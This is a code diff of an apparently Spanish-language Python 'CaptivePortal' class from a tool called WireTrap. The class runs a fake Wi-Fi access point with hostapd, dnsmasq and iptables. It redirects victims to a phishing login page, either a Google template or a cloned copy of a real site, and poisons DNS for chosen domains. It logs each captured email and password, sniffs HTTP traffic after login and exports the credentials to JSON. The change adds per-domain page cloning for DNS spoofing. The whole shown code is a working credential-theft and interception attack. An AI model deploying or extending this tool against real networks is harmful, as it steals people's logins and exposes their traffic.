-        # para que los dominios no espoofeados resuelvan correctamente post-login,
-        # mientras los espoofeados siguen apuntando al portal (address=/dominio/IP).
-        # Así NO necesitamos hacer DNAT del puerto 53 en _grant_internet: dnsmasq
-        # ya es el DNS legítimo del cliente y hace el reenvío al upstream él mismo.
         if self.dns_spoof_domains:
-            # Con DNS Spoofing: dnsmasq reenvía DNS real al upstream para dominios
-            # no espoofeados. El wildcard address=/#/ se elimina para no bloquear todo.
-            conf = (
-                f"interface={self.interface}\n"
-                f"bind-interfaces\n"
-                f"dhcp-range={DHCP_START},{DHCP_END},{SUBNET_MASK},5m\n"
-                f"dhcp-option=3,{GATEWAY_IP}\n"
-                f"dhcp-option=6,{GATEWAY_IP}\n"
-                f"dhcp-option=114,http://{GATEWAY_IP}/\n"
-                f"server={UPSTREAM_DNS}\n"   # reenviar DNS no-espoofeado al real
-                f"local-ttl=0\n"
-                f"log-dhcp\n"
-                f"log-queries\n"
-            )
             target = self.dns_spoof_target_ip or GATEWAY_IP
-            for domain in self.dns_spoof_domains:
-                domain = domain.strip().lower()
-                if domain:
-                    # address=/dominio/IP → dnsmasq responde directamente (sin reenviar)
-                    conf += f"address=/{domain}/{target}\n"
-            self._log(f"[DNS Spoof] {len(self.dns_spoof_domains)} dominios → {target}")
-            self._log("[DNS Spoof] Modo: dnsmasq como proxy real + spoofing selectivo")
-        else:
-            # Sin DNS Spoofing: modo portal puro — bloquear todo el DNS al portal
             conf = (
-                f"interface={self.interface}\n"
-                f"bind-interfaces\n"
-                f"dhcp-range={DHCP_START},{DHCP_END},{SUBNET_MASK},5m\n"
-                f"dhcp-option=3,{GATEWAY_IP}\n"
-                f"dhcp-option=6,{GATEWAY_IP}\n"
-                f"dhcp-option=114,http://{GATEWAY_IP}/\n"
-                f"address=/#/{GATEWAY_IP}\n"
-                f"local-ttl=0\n"
-                f"log-dhcp\n"
-                f"no-resolv\n"
+                "interface=" + self.interface + "\n"
+                "bind-interfaces\n"
+                "dhcp-range=" + DHCP_START + "," + DHCP_END + "," + SUBNET_MASK + ",5m\n"
+                "dhcp-option=3," + GATEWAY_IP + "\n"
+                "dhcp-option=6," + GATEWAY_IP + "\n"
+                "dhcp-option=114,http://" + GATEWAY_IP + "/\n"
+                "server=" + UPSTREAM_DNS + "\n"
+                "local-ttl=0\n"
+                "log-dhcp\n"
+                "log-queries\n"
+            )
+            for entry in self.dns_spoof_domains:
+                d = entry["domain"].strip().lower() if isinstance(entry, dict) else entry.strip().lower()
+                if d:
+                    conf += "address=/" + d + "/" + target + "\n"
+            self._log("[DNS Spoof] " + str(len(self.dns_spoof_domains)) + " dominios → " + target)
+        else:
+            conf = (
+                "interface=" + self.interface + "\n"
+                "bind-interfaces\n"
+                "dhcp-range=" + DHCP_START + "," + DHCP_END + "," + SUBNET_MASK + ",5m\n"
+                "dhcp-option=3," + GATEWAY_IP + "\n"
+                "dhcp-option=6," + GATEWAY_IP + "\n"
+                "dhcp-option=114,http://" + GATEWAY_IP + "/\n"
+                "address=/#/" + GATEWAY_IP + "\n"
+                "local-ttl=0\n"
+                "log-dhcp\n"
+                "no-resolv\n"
             )
         open(self._dnsmasq_conf, "w").write(conf)
-        self._log(f"dnsmasq.conf → {self._dnsmasq_conf}")
-
-    # ── Red ──────────────────────────────────────────────────────
+        self._log("dnsmasq.conf → " + self._dnsmasq_conf)
 
     def _configure_interface(self):
         subprocess.run(["nmcli", "dev", "set", self.interface, "managed", "no"],
                        capture_output=True)
         subprocess.run(["ip", "link", "set", self.interface, "up"], capture_output=True)
         subprocess.run(["ip", "addr", "flush", "dev", self.interface], capture_output=True)
-        subprocess.run(["ip", "addr", "add", f"{GATEWAY_IP}/24", "dev", self.interface],
+        subprocess.run(["ip", "addr", "add", GATEWAY_IP + "/24", "dev", self.interface],
                        capture_output=True)
-        self._log(f"Interfaz {self.interface} → {GATEWAY_IP}/24")
+        self._log("Interfaz " + self.interface + " → " + GATEWAY_IP + "/24")
 
     def _setup_iptables_portal(self):
-        """
-        Configura iptables para el modo portal:
-          - DNAT TCP/80 y 443 al Flask local
-          - FORWARD DROP para todo el tráfico (sin internet)
-          - ESTABLISHED/RELATED ACCEPT para que el NAT funcione luego
-        """
         iface = self.interface
         subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
         subprocess.run(["iptables", "-F"], capture_output=True)
@@ -709,33 +825,22 @@ class CaptivePortal:
 
         subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING",
                         "-i", iface, "-p", "tcp", "--dport", "80",
-                        "-j", "DNAT", f"--to-destination={GATEWAY_IP}:{FLASK_PORT}"],
+                        "-j", "DNAT", "--to-destination=" + GATEWAY_IP + ":" + str(FLASK_PORT)],
                        capture_output=True)
         subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING",
                         "-i", iface, "-p", "tcp", "--dport", "443",
-                        "-j", "DNAT", f"--to-destination={GATEWAY_IP}:{FLASK_PORT}"],
+                        "-j", "DNAT", "--to-destination=" + GATEWAY_IP + ":" + str(FLASK_PORT)],
                        capture_output=True)
 
         subprocess.run(["iptables", "-A", "FORWARD",
                         "-m", "conntrack", "--ctstate", "ESTABLISHED,RELATED",
                         "-j", "ACCEPT"], capture_output=True)
-
         subprocess.run(["iptables", "-A", "FORWARD", "-i", iface, "-j", "DROP"],
                        capture_output=True)
 
         self._log("iptables: modo portal (sin internet)")
 
     def _grant_internet(self, client_ip):
-        """
-        Abre internet real para una IP que ya pasó el portal.
-
-        Problema resuelto:
-          dnsmasq tiene address=/#/GATEWAY_IP que envenena TODOS los dominios.
-          Aunque abramos el FORWARD y pongamos MASQUERADE, el móvil sigue
-          resolviendo google.com → 10.0.0.1 (portal) en lugar del IP real.
-          Solución: DNAT UDP/TCP 53 de esta IP al DNS real (8.8.8.8).
-          Así su DNS va directo a Google en lugar de pasar por dnsmasq.
-        """
         iface  = self.interface
         out_if = self.out_interface
 
@@ -743,40 +848,27 @@ class CaptivePortal:
                        capture_output=True)
 
         if self.dns_spoof_domains:
-            # Modo DNS Spoofing: dnsmasq actúa como proxy DNS real (tiene server=8.8.8.8).
-            # El cliente ya apunta a dnsmasq (10.0.0.1) por DHCP, así que no necesitamos
-            # DNAT del puerto 53. dnsmasq reenvía al upstream para dominios no espoofeados
-            # y sigue respondiendo con la IP del portal para los dominios espoofeados.
-            # Solo necesitamos permitir que dnsmasq (corriendo en el gateway) alcance 8.8.8.8.
-            subprocess.run(["iptables", "-I", "FORWARD", "1",
-                            "-i", iface, "-o", out_if,
-                            "-p", "udp", "--dport", "53", "-j", "ACCEPT"],
-                           capture_output=True)
-            subprocess.run(["iptables", "-I", "FORWARD", "1",
-                            "-i", iface, "-o", out_if,
-                            "-p", "tcp", "--dport", "53", "-j", "ACCEPT"],
-                           capture_output=True)
+            # Modo DNS Spoofing: dnsmasq ya hace de proxy DNS real (server=UPSTREAM_DNS).
+            # El cliente apunta a dnsmasq por DHCP, no necesitamos DNAT del port 53.
+            for proto in ("udp", "tcp"):
+                subprocess.run(["iptables", "-I", "FORWARD", "1",
+                                "-i", iface, "-o", out_if,
+                                "-p", proto, "--dport", "53", "-j", "ACCEPT"],
+                               capture_output=True)
         else:
-            # Modo portal puro: redirigir el DNS del cliente al upstream real post-login
-            subprocess.run(["iptables", "-t", "nat", "-I", "PREROUTING", "1",
-                            "-i", iface, "-s", client_ip,
-                            "-p", "udp", "--dport", "53",
-                            "-j", "DNAT", f"--to-destination={UPSTREAM_DNS}:53"],
-                           capture_output=True)
-            subprocess.run(["iptables", "-t", "nat", "-I", "PREROUTING", "1",
-                            "-i", iface, "-s", client_ip,
-                            "-p", "tcp", "--dport", "53",
-                            "-j", "DNAT", f"--to-destination={UPSTREAM_DNS}:53"],
-                           capture_output=True)
+            # Modo portal puro: redirigir DNS del cliente al upstream post-login
+            for proto in ("udp", "tcp"):
+                subprocess.run(["iptables", "-t", "nat", "-I", "PREROUTING", "1",
+                                "-i", iface, "-s", client_ip,
+                                "-p", proto, "--dport", "53",
+                                "-j", "DNAT", "--to-destination=" + UPSTREAM_DNS + ":53"],
+                               capture_output=True)
 
-        subprocess.run(["iptables", "-t", "nat", "-I", "PREROUTING", "1",
-                        "-i", iface, "-s", client_ip,
-                        "-p", "tcp", "--dport", "80", "-j", "RETURN"],
-                       capture_output=True)
-        subprocess.run(["iptables", "-t", "nat", "-I", "PREROUTING", "1",
-                        "-i", iface, "-s", client_ip,
-                        "-p", "tcp", "--dport", "443", "-j", "RETURN"],
-                       capture_output=True)
+        for port in ("80", "443"):
+            subprocess.run(["iptables", "-t", "nat", "-I", "PREROUTING", "1",
+                            "-i", iface, "-s", client_ip,
+                            "-p", "tcp", "--dport", port, "-j", "RETURN"],
+                           capture_output=True)
 
         subprocess.run(["iptables", "-I", "FORWARD", "1",
                         "-i", iface, "-s", client_ip,
@@ -789,29 +881,24 @@ class CaptivePortal:
 
         subprocess.run(["iptables", "-A", "FORWARD", "-i", iface, "-j", "DROP"],
                        capture_output=True)
-
         subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING",
                         "-s", client_ip, "-o", out_if, "-j", "MASQUERADE"],
                        capture_output=True)
 
-        subprocess.run(["iptables", "-I", "FORWARD", "1",
-                        "-i", iface, "-s", client_ip,
-                        "-p", "udp", "--dport", "53", "-j", "ACCEPT"],
-                       capture_output=True)
-        subprocess.run(["iptables", "-I", "FORWARD", "1",
-                        "-i", iface, "-s", client_ip,
-                        "-p", "tcp", "--dport", "53", "-j", "ACCEPT"],
-                       capture_output=True)
+        for proto in ("udp", "tcp"):
+            subprocess.run(["iptables", "-I", "FORWARD", "1",
+                            "-i", iface, "-s", client_ip,
+                            "-p", proto, "--dport", "53", "-j", "ACCEPT"],
+                           capture_output=True)
 
-        self._log(f"[+] Internet concedido a {client_ip} via {out_if} (DNS → {UPSTREAM_DNS})")
+        self._log("[+] Internet concedido a " + client_ip + " via " + out_if +
+                  " (DNS → " + UPSTREAM_DNS + ")")
 
     def _clear_iptables(self):
         subprocess.run(["iptables", "-F"], capture_output=True)
         subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True)
         subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
         self._log("iptables limpiado")
-
-    # ── Subprocesos ──────────────────────────────────────────────
 
     def _start_hostapd(self):
         try:
@@ -821,15 +908,15 @@ class CaptivePortal:
             time.sleep(2)
             if self._hostapd_proc.poll() is not None:
                 out = self._hostapd_proc.stdout.read().decode(errors="ignore")
-                self._err(f"hostapd terminó prematuramente:\n{out}")
+                self._err("hostapd terminó prematuramente:\n" + out)
                 return False
-            self._log(f"hostapd arrancado (PID {self._hostapd_proc.pid})")
+            self._log("hostapd arrancado (PID " + str(self._hostapd_proc.pid) + ")")
             return True
         except FileNotFoundError:
             self._err("hostapd no encontrado: sudo apt install hostapd")
             return False
         except Exception as e:
-            self._err(f"Error hostapd: {e}")
+            self._err("Error hostapd: " + str(e))
             return False
 
     def _start_dnsmasq(self):
@@ -843,15 +930,15 @@ class CaptivePortal:
             time.sleep(1)
             if self._dnsmasq_proc.poll() is not None:
                 out = self._dnsmasq_proc.stdout.read().decode(errors="ignore")
-                self._err(f"dnsmasq terminó prematuramente:\n{out}")
+                self._err("dnsmasq terminó prematuramente:\n" + out)
                 return False
-            self._log(f"dnsmasq arrancado (PID {self._dnsmasq_proc.pid})")
+            self._log("dnsmasq arrancado (PID " + str(self._dnsmasq_proc.pid) + ")")
             return True
         except FileNotFoundError:
             self._err("dnsmasq no encontrado: sudo apt install dnsmasq")
             return False
         except Exception as e:
-            self._err(f"Error dnsmasq: {e}")
+            self._err("Error dnsmasq: " + str(e))
             return False
 
     def _start_flask(self):
@@ -867,7 +954,8 @@ class CaptivePortal:
             creds_log=self.captured_creds,
             custom_html=self.custom_html if self.template_type == "custom" else None,
             on_credential=self._on_new_credential,
-            on_client_login=self._on_client_login
+            on_client_login=self._on_client_login,
+            dns_spoof_domains=self.dns_spoof_domains if self.dns_spoof_domains else None
         )
         if not app:
             self._err("No se pudo construir la app Flask.")
@@ -880,11 +968,11 @@ class CaptivePortal:
                 app.run(host="0.0.0.0", port=FLASK_PORT,
                         threaded=True, use_reloader=False, debug=False)
             except Exception as ex:
-                self._err(f"Flask error: {ex}")
+                self._err("Flask error: " + str(ex))
 
         self._flask_thread = threading.Thread(target=run_flask, daemon=True)
         self._flask_thread.start()
-        self._log(f"Flask portal en http://0.0.0.0:{FLASK_PORT}")
+        self._log("Flask portal en http://0.0.0.0:" + str(FLASK_PORT))
         return True
 
     def _start_sniffer(self):
@@ -897,28 +985,25 @@ class CaptivePortal:
         self._sniffer = WireTrapSniffer(self.interface)
 
         def _fwd(data):
-            self._log(f"[SNIFF] {data.data_type} | {data.source_ip} | {data.value[:80]}")
+            self._log("[SNIFF] " + data.data_type + " | " + data.source_ip + " | " + data.value[:80])
             if self.on_sniff_data:
                 self.on_sniff_data(data)
 
         self._sniffer.on_data = _fwd
         self._sniffer.start()
-        self._log(f"Sniffer HTTP activo en {self.interface}")
-
-    # ── Callbacks internos ───────────────────────────────────────
+        self._log("Sniffer HTTP activo en " + self.interface)
 
     def _on_new_credential(self, entry):
-        self._log(f"[!!!] CREDENCIAL  IP={entry['ip']}  "
-                  f"email={entry['email']}  pass={entry['password']}")
+        self._log("[!!!] CREDENCIAL  IP=" + entry["ip"] +
+                  "  email=" + entry["email"] + "  pass=" + entry["password"])
         if self.on_credential:
             self.on_credential(entry)
 
     def _on_client_login(self, client_ip):
-        """Llamado por Flask cuando una víctima hace submit."""
         if client_ip in self._logged_in_ips:
             return
         self._logged_in_ips.add(client_ip)
-        self._log(f"[*] Login desde {client_ip} — activando internet + sniffer")
+        self._log("[*] Login desde " + client_ip + " — activando internet + sniffer")
 
         def _activate():
             self._grant_internet(client_ip)
@@ -927,24 +1012,32 @@ class CaptivePortal:
 
         threading.Thread(target=_activate, daemon=True).start()
 
-    # ── API pública ──────────────────────────────────────────────
+    def _clone_spoof_pages(self):
+        """
+        Para cada entrada en dns_spoof_domains que tenga clone_url,
+        clona la página y guarda el HTML en entry["html"].
+        Se llama justo antes de arrancar Flask.
+        """
+        if not self.dns_spoof_domains:
+            return
+        for entry in self.dns_spoof_domains:
+            if not isinstance(entry, dict):
+                continue
+            clone_url = entry.get("clone_url", "").strip()
+            if not clone_url:
+                continue
+            self._log("[DNS Spoof] Clonando " + clone_url + " para dominio " + entry["domain"])
+            html = clone_login_page(clone_url, log_fn=self._log)
+            if html:
+                entry["html"] = html
+                self._log("[DNS Spoof] ✓ Clonado OK (" + str(len(html)) + " bytes) → " + entry["domain"])
+            else:
+                self._log("[DNS Spoof] ✗ Fallo al clonar " + clone_url + " — se usará el portal por defecto")
 
     def start(self, ssid="FreeWiFi", channel=6,
               template="google", out_interface="eth0"):
-        """
-        Arranca el ataque completo.
-
-        Args:
-            ssid:          SSID del AP falso (p.ej. "MallWiFi_FREE")
-            channel:       Canal 802.11 (1-13 para 2.4 GHz)
-            template:      "google" | "custom"
-            out_interface: Interfaz con internet real (eth0, wlan1...)
-
-        Nota: si template=="custom", llama primero a clone_template(url)
-        para preparar self.custom_html antes de start().
-        """
         if self.running:
-            self._log("Ya está en ejecución.")
+            self._log("Ya está en ejecucion.")
             return
 
         self.ssid          = ssid
@@ -956,10 +1049,10 @@ class CaptivePortal:
         self._sniffer = None
 
         self._log("=== Iniciando Captive Portal ===")
-        self._log(f"  SSID      : {self.ssid}")
-        self._log(f"  Canal     : {self.channel}")
-        self._log(f"  Plantilla : {self.template_type}")
-        self._log(f"  Internet  : {self.out_interface}")
+        self._log("  SSID      : " + self.ssid)
+        self._log("  Canal     : " + str(self.channel))
+        self._log("  Plantilla : " + self.template_type)
+        self._log("  Internet  : " + self.out_interface)
 
         if template == "custom" and not self.custom_html:
             self._err("Plantilla personalizada seleccionada pero no se ha clonado ninguna URL. "
@@ -977,6 +1070,9 @@ class CaptivePortal:
 
         self._setup_iptables_portal()
 
+        # Clonar páginas para DNS Spoofing antes de arrancar Flask
+        self._clone_spoof_pages()
+
         if not self._start_flask():
             self._cleanup(); return
 
@@ -986,7 +1082,6 @@ class CaptivePortal:
             self.on_started()
 
     def stop(self):
-        """Detiene todo y limpia el sistema."""
         if not self.running and not self._hostapd_proc and not self._dnsmasq_proc:
             return
 
@@ -1031,13 +1126,12 @@ class CaptivePortal:
         self.stop()
 
     def export_credentials(self, path=None):
-        """Exporta las credenciales capturadas a JSON."""
         if not path:
             ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-            path = f"/tmp/wiretrap_creds_{ts}.json"
+            path = "/tmp/wiretrap_creds_" + ts + ".json"
         with open(path, "w") as f:
             json.dump(self.captured_creds, f, indent=2, ensure_ascii=False)
-        self._log(f"Credenciales exportadas → {path}")
+        self._log("Credenciales exportadas → " + path)
         return path
 
 
@@ -1056,10 +1150,10 @@ if __name__ == "__main__":
     clone_url = sys.argv[4] if len(sys.argv) > 4 else None
 
     cp = CaptivePortal(iface)
-    cp.on_log        = lambda m: print(f"[LOG] {m}")
-    cp.on_error      = lambda m: print(f"[ERR] {m}")
-    cp.on_credential = lambda e: print(f"\n[!!!] CAPTURADO: {e}\n")
-    cp.on_sniff_data = lambda d: print(f"[SNIFF] {d.data_type} {d.source_ip} {d.value[:60]}")
+    cp.on_log        = lambda m: print("[LOG] " + m)
+    cp.on_error      = lambda m: print("[ERR] " + m)
+    cp.on_credential = lambda e: print("\n[!!!] CAPTURADO: " + str(e) + "\n")
+    cp.on_sniff_data = lambda d: print("[SNIFF] " + d.data_type + " " + d.source_ip + " " + d.value[:60])
 
     if clone_url:
         if not cp.clone_template(clone_url):
